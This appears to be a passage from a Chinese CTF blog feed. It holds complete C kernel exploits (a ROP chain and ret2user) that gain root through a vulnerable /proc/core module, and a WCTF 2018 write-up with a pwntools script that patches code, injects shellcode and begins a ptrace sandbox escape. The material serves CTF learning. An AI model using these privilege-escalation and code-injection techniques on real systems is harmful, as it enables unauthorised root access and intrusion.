class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setoff</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889C</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889b</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889a</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"movq %%cs, %0\n"</span></span><br><span class="line"><span class="string">"movq %%ss, %1\n"</span></span><br><span class="line"><span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line"><span class="string">"pushfq\n"</span></span><br><span class="line"><span class="string">"popq %2\n"</span></span><br><span class="line">:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">"memory"</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd ;</span><br><span class="line"><span class="keyword">size_t</span> tmp ;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x50</span>];</span><br><span class="line"><span class="keyword">size_t</span> shellcode[<span class="number">0x100</span>];</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base,canary,module_core_base;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds =  <span class="number">0x9c8e0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0x9cce0</span>;</span><br><span class="line">save_stats();</span><br><span class="line">fd = open(<span class="string">"/proc/core"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open /proc/core error!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">setoff(fd,<span class="number">0x40</span>);</span><br><span class="line">core_read(fd,buf);</span><br><span class="line"><span class="comment">/*for test</span></span><br><span class="line"><span class="comment">for(int i = 0;i&lt;8;i++)&#123;</span></span><br><span class="line"><span class="comment">tmp = *(size_t *)(&amp;buf[i*8]);</span></span><br><span class="line"><span class="comment">printf("[%d] %p\n",i,tmp);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">size_t</span> pop_rdi = <span class="number">0x000b2f</span>;</span><br><span class="line"><span class="keyword">size_t</span> push_rax =  <span class="number">0x02d112</span>;</span><br><span class="line"><span class="keyword">size_t</span> swapgs = <span class="number">0x0d6</span>;</span><br><span class="line"><span class="keyword">size_t</span> iret ;</span><br><span class="line"><span class="keyword">size_t</span> xchg = <span class="number">0x16684f0</span>;</span><br><span class="line"><span class="keyword">size_t</span> call_rax=<span class="number">0x40398</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rcx = <span class="number">0x21e53</span>;</span><br><span class="line"><span class="keyword">size_t</span> pop_rbp = <span class="number">0x3c4</span>; <span class="comment">//: pop rbp ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> pop_rdx = <span class="number">0xa0f49</span> ;<span class="comment">//: pop rdx ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> mov_rdi_rax_call_rdx = <span class="number">0x01aa6a</span>;</span><br><span class="line">vmlinux_base = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">4</span>*<span class="number">8</span>])<span class="number">-0x1dd6d1</span> );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] vmlinux_base:%p\n"</span>,vmlinux_base);</span><br><span class="line">canary = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">0</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] canary:%p\n"</span>,canary);</span><br><span class="line">module_core_base = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">2</span>*<span class="number">8</span>])<span class="number">-0x19b</span> );</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] module_core_base:%p\n"</span>,module_core_base);</span><br><span class="line">commit_creds+=vmlinux_base;</span><br><span class="line">prepare_kernel_cred += vmlinux_base;</span><br><span class="line">pop_rdi += vmlinux_base;</span><br><span class="line">push_rax += vmlinux_base;</span><br><span class="line">swapgs += module_core_base ;</span><br><span class="line">iret = <span class="number">0x50ac2</span>+vmlinux_base;</span><br><span class="line">xchg += vmlinux_base;</span><br><span class="line">call_rax += vmlinux_base;</span><br><span class="line">pop_rcx += vmlinux_base;</span><br><span class="line">mov_rdi_rax_call_rdx +=vmlinux_base;</span><br><span class="line">pop_rdx += vmlinux_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] commit_creds:%p\n"</span>,commit_creds);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] prepare_kernel_cred:%p\n"</span>,prepare_kernel_cred);</span><br><span class="line"><span class="comment">//shellcode[0]=shellcode[0]</span></span><br><span class="line"><span class="comment">//shellcode[] =</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)&#123;</span><br><span class="line">shellcode[i]=canary;</span><br><span class="line">&#125; </span><br><span class="line">shellcode[<span class="number">9</span>] = (*(<span class="keyword">size_t</span> *)(&amp;buf[<span class="number">1</span>]) );</span><br><span class="line">shellcode[<span class="number">10</span>] = pop_rdi;<span class="comment">//0xdeadbeefdeadbeef;</span></span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">shellcode[<span class="number">13</span>] = pop_rdx;</span><br><span class="line">shellcode[<span class="number">14</span>] = pop_rcx;</span><br><span class="line">shellcode[<span class="number">15</span>] = mov_rdi_rax_call_rdx;</span><br><span class="line">shellcode[<span class="number">16</span>] = commit_creds;</span><br><span class="line">shellcode[<span class="number">17</span>] = swapgs;</span><br><span class="line">shellcode[<span class="number">18</span>] = shellcode;</span><br><span class="line">shellcode[<span class="number">19</span>] = iret;</span><br><span class="line">shellcode[<span class="number">20</span>] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">shellcode[<span class="number">21</span>] = user_cs;</span><br><span class="line">shellcode[<span class="number">22</span>] = user_eflags;</span><br><span class="line">shellcode[<span class="number">23</span>] = user_sp;</span><br><span class="line">shellcode[<span class="number">24</span>] = user_ss;</span><br><span class="line"></span><br><span class="line">write(fd,shellcode,<span class="number">25</span>*<span class="number">8</span>);</span><br><span class="line">core_copy_func(fd,<span class="number">0xf000000000000000</span>+<span class="number">25</span>*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ret2user"><a href="#ret2user" class="headerlink" title="ret2user"></a>ret2user</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">"movq %%cs, %0\n"</span></span><br><span class="line"><span class="string">"movq %%ss, %1\n"</span></span><br><span class="line"><span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line"><span class="string">"pushfq\n"</span></span><br><span class="line"><span class="string">"popq %2\n"</span></span><br><span class="line">:<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">"memory"</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//eip =(unsigned long long) get_shell;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span>*) KERNCALL ;</span><br><span class="line"><span class="keyword">void</span> (*commit_creds)(<span class="keyword">void</span>*) KERNCALL ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span></span>&#123;</span><br><span class="line">      commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setoff</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> off)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889C</span>,off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy</span><span class="params">(<span class="keyword">int</span> fd , <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> len)</span></span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889A</span>,len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">save_stats() ; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> buf[<span class="number">0x40</span>/<span class="number">8</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> canary ;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> module_base ;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> vmlinux_base ; </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> iretq ;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> swapgs ;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rop[<span class="number">0x30</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,O_RDWR);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"open file error\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"open file success\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] buf: 0x%p"</span>,buf);</span><br><span class="line">setoff(fd,<span class="number">0x40</span>);</span><br><span class="line">core_read(fd,buf);</span><br><span class="line">canary = buf[<span class="number">0</span>];</span><br><span class="line">module_base =  buf[<span class="number">2</span>] - <span class="number">0x19b</span>;</span><br><span class="line">vmlinux_base = buf[<span class="number">4</span>] - <span class="number">0x16684f0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] canary: 0x%p"</span>,canary);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] module_base: 0x%p"</span>,module_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] vmlinux_base: 0x%p"</span>,vmlinux_base);</span><br><span class="line">commit_creds = vmlinux_base + <span class="number">0x9c8e0</span>;</span><br><span class="line">prepare_kernel_cred = vmlinux_base + <span class="number">0x9cce0</span>;</span><br><span class="line">iretq = vmlinux_base + <span class="number">0x50ac2</span>;</span><br><span class="line">swapgs  = module_base + <span class="number">0x0d6</span>;</span><br><span class="line">rop[<span class="number">8</span>] = canary ; </span><br><span class="line">rop[<span class="number">10</span>] = payload;</span><br><span class="line">rop[<span class="number">11</span>] = swapgs;</span><br><span class="line">rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">rop[<span class="number">13</span>] = iretq ;</span><br><span class="line">rop[<span class="number">14</span>] = get_shell ; </span><br><span class="line">rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">rop[<span class="number">16</span>] = user_eflags;</span><br><span class="line">rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">rop[<span class="number">18</span>] = user_ss;</span><br><span class="line">rop[<span class="number">19</span>] = <span class="number">0</span>;</span><br><span class="line">write(fd,rop,<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line">core_copy(fd,<span class="number">0xf000000000000000</span>+<span class="number">0x30</span>*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a></p><p><a href="http://bobao.360.cn/learning/detail/3702.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3702.html</a></p>]]></content>
    
    <summary type="html">
    
      最近刚开始学习内核PWN相关的东西， 把2018年国赛的一道简单内核题作为我的第一道KERNEL PWN，虽然比赛已经过去好久了...
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="KERNEL" scheme="http://p4nda.top/tags/KERNEL/"/>
    
  </entry>
  
  <entry>
    <title>【WCTF 2018】parrot_revenge 题解</title>
    <link href="http://p4nda.top/2018/07/11/WCTF-2018/"/>
    <id>http://p4nda.top/2018/07/11/WCTF-2018/</id>
    <published>2018-07-11T03:41:05.000Z</published>
    <updated>2018-07-11T03:59:53.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="parrot-revenge"><a href="#parrot-revenge" class="headerlink" title="parrot_revenge"></a>parrot_revenge</h1><h2 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h2><p>题目给出了两个binary文件，分别是parent和parrot_revenge。</p><h3 id="parent"><a href="#parent" class="headerlink" title="parent"></a>parent</h3><p>这是个沙箱程序，使用fork开辟了一个子进程，并用execve将parrot_revenge的子进程加载到当前的代码段，并用ptrace实现了对子进程的监控。</p><p>再看父进程，实现了一个对子进程的沙箱逻辑。具体实现在0x400a33这个函数中：</p><p>首先进行了沙箱的初始化，对于子进程将call malloc处的第一个字节由0xe8改为0xcc，并将原来的值存储起来，这样在子进程执行到call malloc处的时候就会产生一个中断，可以被父进程监听到。</p><p><img src="/img/wctf2018/1-3.png" alt=""></p><p>当执行完成后，父进程会在一个死循环里监听子进程的系统调用，系统调用分为两种，第一种是父进程在初始化时对call malloc的0xcc中断，另外一种是程序正常调用的syscall中断。</p><p>对这两种中断分别的处理方法如下：</p><p>首先检查rip，即程序执行的地址是否为call malloc，进而检查是否执行的代码是0xcc，再检查程序rdi寄存器，也就是函数第一个参数是否在0x6f到0x1000范围内，如果是则rip-1，并恢复call malloc代码，再使用单步执行（singlestep）方法执行一条指令，再次保存call malloc地址指令，并重置为0xcc。</p><p><img src="/img/wctf2018/1-4.png" alt=""></p><p>如不是，则检查系统调用号，当系统调用号不为0、1、9、12，则将子进程杀死。</p><p><img src="/img/wctf2018/1-5.png" alt=""></p><h3 id="parrot-revenge-1"><a href="#parrot-revenge-1" class="headerlink" title="parrot_revenge"></a>parrot_revenge</h3><p>子进程的逻辑很简单，在while循环中循环执行操作，包括malloc、read、write，当控制的局部变量为1时，退出操作。</p><p><img src="/img/wctf2018/1-6.png" alt=""></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>程序在父进程和子进程中均存在漏洞。</p><h3 id="parrot-revenge-2"><a href="#parrot-revenge-2" class="headerlink" title="parrot_revenge"></a>parrot_revenge</h3><p>在子进程中malloc过后，即向得到的地址+size处写\x00操作，这个漏洞和SUCTF 2018的noend题目一样，都未检查malloc函数的返回值，当size过大时，malloc会返回0，这样size+0取决于size，造成一个内存任意写一字节0的漏洞。</p><h3 id="parent-1"><a href="#parent-1" class="headerlink" title="parent"></a>parent</h3><p>父进程中存在一个漏洞，这个漏洞在程序执行call malloc的ptrace(PTRACE_SINGLESTEP, pid, 0LL, 0LL);执行过后，会取得该处指令去更新保存的静态变量，当单步执行改变了call malloc处指令时，程序在下一次执行时就会执行非保存的call指令(\xe8)。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个程序最开始以为是只有一次执行的，因为无法预知栈地址，不能找到程序的循环次数变量来覆写，就很尴尬。一度以为没法做。</p><p>在赛场测试中无意发现，当size取0x4007ae时，会向cmp eax,1处写0，造成程序在while循环中无限循环… 但是在本地却无法更改，没有搭起本地调试环境。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>在赛后与主办方交流时候发现，其实这题在题目描述中给了hint来搭建本地环境。</p><p>在题目中提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Env : Linux DESKTOP-ES068S3 4.4.0-17134-Microsoft #81-Microsoft Sun May 20 01:14:00 PST 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><p>这代表是Windows10操作系统的ubuntu子系统，在比赛结束后，我根据<a href="https://www.jianshu.com/p/bc38ed12da1d" target="_blank" rel="noopener">这篇博客</a>里所述的操作搭建起了环境，注意选择应用商店中的ubuntu 16.04。在搭建好环境后，我使用gdb挂起程序，发现了linux和Windows子系统环境的不同，在Windows的子系统中被ptrace子程序的代码段是rwx的，而linux中是r-x的，这也是赛场环境中可以改代码段的原因。</p><p>Ubuntu 16.04</p><p><img src="/img/wctf2018/1-1.png" alt=""></p><p>Window10子系统ubuntu 16.04</p><p><img src="/img/wctf2018/1-2.png" alt=""></p><h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>在比赛时发现了代码段可以改时，我们进行了疯狂测试，发现全部代码段都是可以改的，只要保证程序汇编指令不崩溃。</p><p>首先我们发现程序主要识别变量的方法是mov rax,[rbp+size]及mov [rbp+size],rax。而size这个变量是单字节表示的，当size=0时，即mov [rbp+0],rax。而在main函数中，rbp指向的内容是_libc_csu_init函数的地址，是在.text段上的0x4007C0位置</p><p><img src="/img/wctf2018/1-7.png" alt=""></p><p>而这个位置位于main函数的高地址部分。</p><p>当修改下图中的ptr变量，即可在每次函数写时，向_libc_csu_init写入内容。</p><p><img src="/img/wctf2018/1-8.png" alt=""></p><p><img src="/img/wctf2018/1-8-1.png" alt=""></p><p>注意到函数的exit(0)调用使用的汇编语句是 e8 82 fd ff ff ff</p><p><img src="/img/wctf2018/1-9.png" alt=""></p><p>这样的call指令跳转方法是用的相对偏移来定的，当我们向该位置写\x00使这条指令变成 e8 82 00 00 00时，就变成了调用当前eip（0x4007be）+0x82的位置——0x400840，而这个位置恰好在0x4007c0的高地址位置，也就是说我们可以先向这个位置写汇编指令，再退出就可以跳转拿到我们预先布置的shellcode上了。</p><p>还需要解决如何退出的问题，我们之前用cmp rax，0来保证程序循环，我们将</p><p><img src="/img/wctf2018/1-10.png" alt=""></p><p>中红框两处代码均改为[rbp+0]，即可达到效果，上述改动需要保证一定的顺序，使得程序不崩溃。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(len,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'ize:'</span>)</span><br><span class="line">p.sendline(str(len))</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"><span class="comment">#'4196270'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc2</span><span class="params">(len,content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Size:'</span>)</span><br><span class="line">p.sendline(str(len))</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line"><span class="comment">#p.send(content)</span></span><br><span class="line"><span class="comment"># cmp 0</span></span><br><span class="line">malloc(<span class="number">0x4007AE</span>,<span class="string">''</span>)</span><br><span class="line"><span class="comment"># exit 0*3</span></span><br><span class="line">malloc(<span class="number">0x4007B9</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007B8</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007B7</span> + <span class="number">5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x4007A5</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x400789</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0x400762</span>,<span class="string">''</span>)</span><br><span class="line">core =  shellcraft.amd64.write(<span class="number">1</span>, <span class="string">'input:'</span>, <span class="number">0x10</span>) + shellcraft.amd64.read(<span class="number">0</span>,<span class="number">0x400700</span>,<span class="number">0x100</span>) + <span class="string">"mov rax,0x400700\njmp rax\n"</span> </span><br><span class="line">shellcode = asm(<span class="string">'lab1 : '</span> + core +<span class="string">'nop\n'</span> * (<span class="number">0x80</span> - len(asm(core,arch = <span class="string">'amd64'</span>))) + <span class="string">'jmp lab1'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line">malloc(<span class="number">0x150</span>, shellcode)</span><br><span class="line">p.recvuntil(<span class="string">'Buffer:'</span>)</span><br><span class="line">malloc(<span class="number">0x400736</span>,<span class="string">''</span>)</span><br><span class="line">malloc(<span class="number">0</span>,<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>这样可以执行我们写入的core代码。</p><h3 id="沙箱逃逸"><a href="#沙箱逃逸" class="headerlink" title="沙箱逃逸"></a>沙箱逃逸</h3><p>注意到程序本身存在一个ptrace沙箱，只能执行部分系统调用，可以执行的系统调用时read、write、mmap、exit显然不能拿到flag，比赛结束前我们就卡在这里…</p><p>在比赛结束后，听了出题队伍的分享，根据里面的hint做出了沙箱逃逸的部分（PPT照片在最后）</p><p>首先，利用的漏洞就是漏洞分析中提到的，当单步执行的代码会改变该条指令时，即可在下一次执行时改变执行的语句。由于singlestep仅能执行一条指令，所以再执行该条指令时需对执行进行自修改。</p><p>第一次保存的代码是\xe8，即call指令，而call执行时会在栈上push一个返回地址，当将栈指向当前指令执行位置时，可以将该条指令改变，此次将其改变为\x00，shellcode布置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x400700 mov rdi,0x70         #绕过rdi的范围检查</span><br><span class="line">mov r9,0x40073e</span><br><span class="line">xchg rsp,r9</span><br><span class="line">nop nop ; padding</span><br><span class="line">0x40073D \xcc\x00\x00\x00\x00 #在实际运行时会变成call 